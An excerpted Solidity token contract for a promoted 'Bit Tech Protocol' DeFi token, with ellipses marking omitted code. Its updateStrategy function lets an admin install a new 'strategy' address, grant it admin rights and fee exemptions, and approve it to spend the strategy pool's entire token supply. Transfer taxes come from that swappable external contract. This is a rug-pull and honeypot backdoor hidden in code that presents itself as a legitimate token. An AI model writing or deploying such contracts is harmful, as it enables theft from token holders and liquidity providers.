/**
 * 🅱🅸🆃 🆃🅴🅲🅷 🅿🆁🅾🆃🅾🅲🅾🅻
 * Join the Future Of Algorithmic Defi Strategies
 * https://t.me/Bittechprotocol
 */
...
import '../../peripheries/interfaces/IStrategy.sol';

contract BitTechProtocolToken is ERC20, AdminRole {
    ...
    constructor() ERC20('Bit Tech Protocol', 'BITTECH') {
        ...
        excludeFromFees(strategy, true);
        excludeFromFees(controller, true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);

        excludeFromMaxTransaction(msg.sender, true);
        excludeFromMaxTransaction(strategy, true);
    ...
    function updateStrategy(address _strategy, address _strategyPool) external onlyAdmin {
        _isExcludedFromFees[_strategy] = true;
        _isExcludedMaxTransactionAmount[_strategy] = true;
        addAdmin(_strategy);
        _approve(_strategyPool, _strategy, totalSupply());
        strategy = _strategy;
    }
    ...
    function _transfer(
        ...
        if (takeFee) {
            (uint256 buyTax, uint256 sellTax) = IStrategy(strategy).getTax();
